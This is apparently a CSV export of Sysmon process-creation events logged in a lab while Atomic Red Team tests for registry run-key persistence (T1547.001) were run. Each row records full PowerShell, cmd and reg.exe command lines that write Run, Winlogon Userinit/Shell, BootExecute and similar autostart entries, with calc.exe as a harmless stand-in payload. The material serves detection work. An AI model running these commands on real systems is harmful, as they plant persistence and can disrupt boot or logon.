"Timestamp","RuleTitle","Level","Computer","Channel","EventID","MitreTactics","MitreTags","OtherTags","RecordID","Details","ExtraFieldInfo","RuleFile","RuleID","EvtxFile"
"2025-12-26 11:19:13.697 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173626,"Cmdline: ""powershell.exe"" & {if (!(Test-Path -Path \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""")){ New-Item -ItemType Key -Path \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""" } Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""" -Name \""""atomictest\"""" -Value \""""C:\Windows\System32\calc.exe\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 2424 ¦ PGUID: E9F06A57-6121-694E-9401-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {if (!(Test-Path -Path \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""")){ New-Item -ItemType Key -Path \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""" } Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""" -Name \""""atomictest\"""" -Value \""""C:\Windows\System32\calc.exe\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:13.680","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:16.429 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173629,"Cmdline: ""powershell.exe"" & {$oldvalue = $(Get-ItemPropertyValue -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit\""""); Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit-backup\"""" -Value \""""$oldvalue\""""; $newvalue = $oldvalue + \"""" C:\Windows\System32\calc.exe\""""; Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit\"""" -Value \""""$newvalue\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 6056 ¦ PGUID: E9F06A57-6124-694E-9601-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {$oldvalue = $(Get-ItemPropertyValue -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit\""""); Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit-backup\"""" -Value \""""$oldvalue\""""; $newvalue = $oldvalue + \"""" C:\Windows\System32\calc.exe\""""; Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit\"""" -Value \""""$newvalue\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:16.419","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:17.103 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173633,"Cmdline: ""powershell.exe"" & {$oldvalue = $(Get-ItemPropertyValue -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell\""""); Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell-backup\"""" -Value \""""$oldvalue\""""; $newvalue = $oldvalue + \"""", C:\Windows\explorer.exe\""""; Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell\"""" -Value \""""$newvalue\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 1448 ¦ PGUID: E9F06A57-6125-694E-9801-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {$oldvalue = $(Get-ItemPropertyValue -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell\""""); Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell-backup\"""" -Value \""""$oldvalue\""""; $newvalue = $oldvalue + \"""", C:\Windows\explorer.exe\""""; Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell\"""" -Value \""""$newvalue\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:17.088","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:17.833 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173637,"Cmdline: ""cmd.exe"" /c secedit /import /db mytemplate.db /cfg ""C:\AtomicRedTeam\atomics\T1547.001\src\regtemplate.ini"" & secedit /configure /db mytemplate.db ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 6952 ¦ PGUID: E9F06A57-6125-694E-9A01-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:17.821","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:17.894 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173638,"Cmdline: secedit /import /db mytemplate.db /cfg ""C:\AtomicRedTeam\atomics\T1547.001\src\regtemplate.ini"" ¦ Proc: C:\Windows\System32\SecEdit.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""cmd.exe"" /c secedit /import /db mytemplate.db /cfg ""C:\AtomicRedTeam\atomics\T1547.001\src\regtemplate.ini"" & secedit /configure /db mytemplate.db ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 1584 ¦ PGUID: E9F06A57-6125-694E-9C01-000000002400 ¦ ParentPID: 6952 ¦ ParentPGUID: E9F06A57-6125-694E-9A01-000000002400 ¦ Description: Windows Security Configuration Editor Command Tool ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=3886FFE2612BD422186F537EC7B90B5E,SHA256=594CFC0512B69061C3BD8D82CD0439D737AC834622AA2F199DFA01E4620DCE7D,IMPHASH=58A66C69176097C9B8C5C9AE4273BD6F","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: SeCEdit ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:17.886","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:18.093 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173639,"Cmdline: secedit /configure /db mytemplate.db ¦ Proc: C:\Windows\System32\SecEdit.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""cmd.exe"" /c secedit /import /db mytemplate.db /cfg ""C:\AtomicRedTeam\atomics\T1547.001\src\regtemplate.ini"" & secedit /configure /db mytemplate.db ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 7084 ¦ PGUID: E9F06A57-6126-694E-9D01-000000002400 ¦ ParentPID: 6952 ¦ ParentPGUID: E9F06A57-6125-694E-9A01-000000002400 ¦ Description: Windows Security Configuration Editor Command Tool ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=3886FFE2612BD422186F537EC7B90B5E,SHA256=594CFC0512B69061C3BD8D82CD0439D737AC834622AA2F199DFA01E4620DCE7D,IMPHASH=58A66C69176097C9B8C5C9AE4273BD6F","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: SeCEdit ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:18.089","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:18.455 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173641,"Cmdline: ""powershell.exe"" & {if (!(Test-Path \""""C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg\"""")) { reg.exe export \""""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\"""" \""""C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg\"""" /y } Set-ItemProperty -Path \""""HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\"""" -Name \""""BootExecute\"""" -Value \""""autocheck autoche *\"""" -Type MultiString} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 1456 ¦ PGUID: E9F06A57-6126-694E-9E01-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {if (!(Test-Path \""""C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg\"""")) { reg.exe export \""""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\"""" \""""C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg\"""" /y } Set-ItemProperty -Path \""""HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\"""" -Name \""""BootExecute\"""" -Value \""""autocheck autoche *\"""" -Type MultiString} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:18.441","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:18.846 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173643,"Cmdline: ""C:\WINDOWS\system32\reg.exe"" export ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager"" C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg /y ¦ Proc: C:\Windows\System32\reg.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {if (!(Test-Path \""""C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg\"""")) { reg.exe export \""""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\"""" \""""C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg\"""" /y } Set-ItemProperty -Path \""""HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\"""" -Name \""""BootExecute\"""" -Value \""""autocheck autoche *\"""" -Type MultiString} ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 7208 ¦ PGUID: E9F06A57-6126-694E-A001-000000002400 ¦ ParentPID: 1456 ¦ ParentPGUID: E9F06A57-6126-694E-9E01-000000002400 ¦ Description: Registry Console Tool ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=47FC2471604EB7D760938BF31456B12D,SHA256=321590E79C53AA24B197F08A21A0329E5AB9F212B2BD748AF09A7BE6F838F585,IMPHASH=3B322244D4C64F3C932F94E6E3457771","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: reg.exe ¦ ParentCommandLine: ""powershell.exe"" & {if (!(Test-Path \""""C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg\"""")) { reg.exe export \""""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\"""" \""""C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg\"""" /y } Set-ItemProperty -Path \""""HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\"""" -Name \""""BootExecute\"""" -Value \""""autocheck autoche *\"""" -Type MultiString} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:18.839","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:19.176 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173645,"Cmdline: ""cmd.exe"" /c reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd"" /f /v StartupPrograms /t REG_SZ /d ""calc"" ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 4676 ¦ PGUID: E9F06A57-6127-694E-A101-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:19.150","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:19.218 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173646,"Cmdline: reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd"" /f /v StartupPrograms /t REG_SZ /d ""calc"" ¦ Proc: C:\Windows\System32\reg.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""cmd.exe"" /c reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd"" /f /v StartupPrograms /t REG_SZ /d ""calc"" ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 8728 ¦ PGUID: E9F06A57-6127-694E-A301-000000002400 ¦ ParentPID: 4676 ¦ ParentPGUID: E9F06A57-6127-694E-A101-000000002400 ¦ Description: Registry Console Tool ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=47FC2471604EB7D760938BF31456B12D,SHA256=321590E79C53AA24B197F08A21A0329E5AB9F212B2BD748AF09A7BE6F838F585,IMPHASH=3B322244D4C64F3C932F94E6E3457771","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: reg.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:19.209","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:19.445 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173647,"Cmdline: ""cmd.exe"" /c reg add HKLM\System\CurrentControlSet\Control\BootVerificationProgram /v ImagePath /t REG_SZ /d ""C:\Program Files\Internet Explorer\iexplore.exe"" ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 6660 ¦ PGUID: E9F06A57-6127-694E-A401-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:19.435","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:19.490 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173648,"Cmdline: reg add HKLM\System\CurrentControlSet\Control\BootVerificationProgram /v ImagePath /t REG_SZ /d ""C:\Program Files\Internet Explorer\iexplore.exe"" ¦ Proc: C:\Windows\System32\reg.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""cmd.exe"" /c reg add HKLM\System\CurrentControlSet\Control\BootVerificationProgram /v ImagePath /t REG_SZ /d ""C:\Program Files\Internet Explorer\iexplore.exe"" ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 7472 ¦ PGUID: E9F06A57-6127-694E-A601-000000002400 ¦ ParentPID: 6660 ¦ ParentPGUID: E9F06A57-6127-694E-A401-000000002400 ¦ Description: Registry Console Tool ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=47FC2471604EB7D760938BF31456B12D,SHA256=321590E79C53AA24B197F08A21A0329E5AB9F212B2BD748AF09A7BE6F838F585,IMPHASH=3B322244D4C64F3C932F94E6E3457771","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: reg.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:19.480","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:19.852 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173650,"Cmdline: ""cmd.exe"" /c reg add ""HKEY_CLASSES_ROOT\Directory\Background\shell\Size Modify\command"" /ve /t REG_SZ /d ""C:\Windows\System32\calc.exe"" /f ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 9072 ¦ PGUID: E9F06A57-6127-694E-A701-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:19.842","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:19.896 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173651,"Cmdline: reg add ""HKEY_CLASSES_ROOT\Directory\Background\shell\Size Modify\command"" /ve /t REG_SZ /d ""C:\Windows\System32\calc.exe"" /f ¦ Proc: C:\Windows\System32\reg.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""cmd.exe"" /c reg add ""HKEY_CLASSES_ROOT\Directory\Background\shell\Size Modify\command"" /ve /t REG_SZ /d ""C:\Windows\System32\calc.exe"" /f ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 2484 ¦ PGUID: E9F06A57-6127-694E-A901-000000002400 ¦ ParentPID: 9072 ¦ ParentPGUID: E9F06A57-6127-694E-A701-000000002400 ¦ Description: Registry Console Tool ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=47FC2471604EB7D760938BF31456B12D,SHA256=321590E79C53AA24B197F08A21A0329E5AB9F212B2BD748AF09A7BE6F838F585,IMPHASH=3B322244D4C64F3C932F94E6E3457771","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: reg.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:19.889","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
